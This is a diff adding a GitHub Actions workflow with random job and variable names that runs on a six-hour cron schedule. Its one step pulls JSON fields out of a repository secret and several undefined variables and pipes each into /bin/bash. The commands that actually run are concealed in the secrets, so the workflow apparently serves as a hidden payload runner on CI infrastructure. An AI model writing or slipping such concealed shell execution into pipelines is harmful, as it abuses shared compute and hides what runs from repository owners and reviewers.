@@ -1,0 +1,25 @@
+name: ruanxingji2808
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '50 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: ruanxingji2808
+        env:
+          bnjb8: ${{ secrets.bnjb8 }}
+        run: |
+          echo $bnjb8 | jq -r .mymkd88 | /bin/bash
+          echo $qbazh749 | jq -r .xeoon33633 | /bin/bash
+          echo $lqtn3 | jq -r .le82 | /bin/bash
+          echo $wxtkc4272 | jq -r .lwg248 | /bin/bash
+          echo $wzj90113 | jq -r .ciebl9 | /bin/bash
+          echo $od774 | jq -r .a351 | /bin/bash
+          echo $gbn91954 | jq -r .hhu9 | /bin/bash
+          echo $o569 | jq -r .dyx7651 | /bin/bash
+
